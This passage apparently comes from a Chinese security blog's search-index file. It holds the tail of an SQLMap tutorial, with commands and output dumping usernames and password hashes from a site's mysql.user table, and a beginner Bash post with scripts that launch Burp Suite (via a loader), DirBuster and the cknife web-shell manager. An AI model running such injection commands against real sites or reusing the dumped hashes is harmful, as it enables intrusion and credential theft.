enum(&#39;N&#39;,&#39;Y&#39;)                     || Trigger_priv           | enum(&#39;N&#39;,&#39;Y&#39;)                     || Update_priv            | enum(&#39;N&#39;,&#39;Y&#39;)                     || x509_issuer            | blob                              || x509_subject           | blob                              |+------------------------+-----------------------------------+</code></pre><p>列出所有数据</p><p><code>sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot; --dump -C user -T user -D mysql</code></p><pre><code class="shell">sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot; --dump -C user -T user -D mysqlDatabase: mysqlTable: user[6 entries]+------------------+| user             |+------------------+| debian-sys-maint || infofaq          || root             || root             || root             || rusty            |+------------------+</code></pre><p><code>sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot; --dump -C password -T user -D mysql</code></p><pre><code class="shell">sqlmap.py -u &quot;https://www.xxx.com/subcat.php?id=2&quot; --dump -C password -T user -D mysqlDatabase: mysqlTable: user[6 entries]+-------------------------------------------+| password                                  |+-------------------------------------------+| *7A3ACC64D7B725A0680FFA56DC07AA09004884CF || *CE54DB2032962B216435BB5F02709003A9BB1C63 || *EBB9DF1F91F4422221737626BD5855965274EEBF || *EBB9DF1F91F4422221737626BD5855965274EEBF || *EBB9DF1F91F4422221737626BD5855965274EEBF || *EEC1F40CA2B7988614C13911FD576B685201396B |+-------------------------------------------+</code></pre>]]></content>
      
      
      <categories>
          
          <category> SQLMap </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> SQLMap </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于BASH脚本的学习</title>
      <link href="/2020/02/24/bash-1/"/>
      <url>/2020/02/24/bash-1/</url>
      
        <content type="html"><![CDATA[<p>这一天，在网上冲浪中度过，发现比较简单实用的bash脚本，看到脚本对日常使用的助力，感觉还不错就记录一下，就当是bash脚本的入门吧。为了避免自己忘记，就在此作为第一篇博客记录一下吧。</p><h2 id="案例一：打开软件的小脚本"><a href="#案例一：打开软件的小脚本" class="headerlink" title="案例一：打开软件的小脚本"></a>案例一：打开软件的小脚本</h2><p>将经常使用的命令写成一个脚本能够提高效率。</p><p><code>vim burp.sh</code></p><pre><code class="bash">#!/bin/bashcd /root/Desktop/burpsuuite1.7.6java -jar BurpLoader.jar</code></pre><p>给文件一个执行权限<code>chmod +x burp.sh</code></p><p><code>./burp.sh</code></p><p>这样，一个简单的脚本文件就完成了。挺简单的，作为一个小白，发现脚本文件真的挺实用的，特别在面对大量重复的命令而言。</p><h2 id="案例二：打开软件脚本的进阶版"><a href="#案例二：打开软件脚本的进阶版" class="headerlink" title="案例二：打开软件脚本的进阶版"></a>案例二：打开软件脚本的进阶版</h2><pre><code class="bash">#!/bin/bash#the tool you want to runread -p &quot;bp == burp ; w == DirBuster ; f == cknife ; p =openvpn ;&quot; choiceif [ &quot;${choice}&quot; == &quot;bp&quot;]; then        cd tool/burpsuite1.7.26        java -jar BurpLoader.jarfiif [ &quot;${choice}&quot; == &quot;w&quot;]; then        cd tool/DirBuster-0.12/        java -jar DirBuster-0.12.jarfiif [ &quot;${choice}&quot; == &quot;f&quot;]; then        cd tool/cknife/        java -jar cknife.jarfiif [ &quot;${choice}&quot; == &quot;p&quot;]; then        cd tool/DirBuster-0.12/        java -jar DirBuster-0.12.jarfi</code></pre><p>在这个脚本中出现了变量，需要注意的是</p><ol><li>变量要用<code>${ }</code>标识</li><li>每一个特定的符号都要用引号<code>&quot;&quot;</code>括起来</li><li><code>if</code>语句要用中括号<code>[]</code>括起来，两边要加空格</li><li><code>cd</code>转换路径，路径左侧不能加<code>/</code>，如<code>cd /tool</code>（错误），<code>/tool</code>表示根目录下的tool文件夹。</li></ol><p>目前关于bash脚本就先记录这些吧。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> BASH </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
